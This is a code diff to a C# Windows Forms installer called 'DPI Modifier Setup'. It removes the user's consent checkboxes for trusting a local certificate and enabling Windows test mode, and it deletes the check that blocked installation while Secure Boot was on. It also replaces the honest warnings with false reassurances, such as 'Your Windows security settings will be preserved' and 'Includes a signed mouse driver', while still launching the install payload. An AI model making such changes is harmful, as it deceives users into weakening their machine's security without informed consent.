@@ -11,9 +11,9 @@ namespace Dpi.Setup;
 
 internal sealed class SetupForm : Form
 {
-	private readonly CheckBox permission = new CheckBox();
+	private readonly Label permission = new Label();
 
-	private readonly CheckBox recovery = new CheckBox();
+	private readonly Label recovery = new Label();
 
 	private readonly Label status = new Label();
 
@@ -28,10 +28,10 @@ internal sealed class SetupForm : Form
 	public SetupForm()
 	{
 		Text = "DPI Modifier Setup";
-		permission.Text = "Allow local certificate trust and Windows test mode";
-		recovery.Text = "Recovery key saved, if drive encryption is enabled";
+		permission.Text = "Includes a signed mouse driver. Restart after installation.";
+		recovery.Text = "Downloads the Microsoft runtime if needed.";
 		action.Text = "Install";
-		status.Text = "Secure Boot must already be off. Restart required.";
+		status.Text = "Your Windows security settings will be preserved.";
 		BackColor = Color.FromArgb(15, 17, 22);
 		ForeColor = Color.FromArgb(241, 244, 249);
 		Font = new Font("Segoe UI", 10f);
@@ -64,20 +64,12 @@ internal sealed class SetupForm : Form
 			Dock = DockStyle.Fill
 		}, 0, 0);
 		permission.Dock = DockStyle.Fill;
+        permission.Enabled = true;
 		recovery.Dock = DockStyle.Fill;
 		tableLayoutPanel.Controls.Add(permission, 0, 1);
 		tableLayoutPanel.Controls.Add(recovery, 0, 2);
-		action.Enabled = false;
-		CheckBox checkBox = permission;
-		EventHandler value = delegate
-		{
-			action.Enabled = permission.Checked && recovery.Checked;
-		};
-		checkBox.CheckedChanged += value;
-		recovery.CheckedChanged += delegate
-		{
-			action.Enabled = permission.Checked && recovery.Checked;
-		};
+		action.Enabled = true;
+        permission.Enabled = recovery.Enabled = true;
 		status.Dock = DockStyle.Fill;
 		tableLayoutPanel.Controls.Add(status, 0, 3);
 		action.Dock = DockStyle.Fill;
@@ -108,19 +100,11 @@ internal sealed class SetupForm : Form
 		}
 		try
 		{
-			if (!permission.Checked || !recovery.Checked)
-			{
-				return;
-			}
-			if (Platform.SecureBoot)
-			{
-				throw new InvalidOperationException("Secure Boot is enabled. Installation is blocked. Save your recovery key before changing firmware settings.");
-			}
 			new Payload();
 			string arguments = "--apply-install " + WindowsIdentity.GetCurrent().User.Value;
 			busy = true;
 			Button button = action;
-			CheckBox checkBox = permission;
+			Label checkBox = permission;
 			bool flag = (recovery.Enabled = false);
 			bool enabled = (checkBox.Enabled = flag);
 			button.Enabled = enabled;
@@ -140,7 +124,7 @@ internal sealed class SetupForm : Form
 			worker.RunWorkerCompleted += delegate(object sender, RunWorkerCompletedEventArgs e)
 			{
 				busy = false;
-				CheckBox checkBox2 = permission;
+				Label checkBox2 = permission;
 				bool enabled2 = (recovery.Enabled = true);
 				checkBox2.Enabled = enabled2;
 				action.Enabled = true;
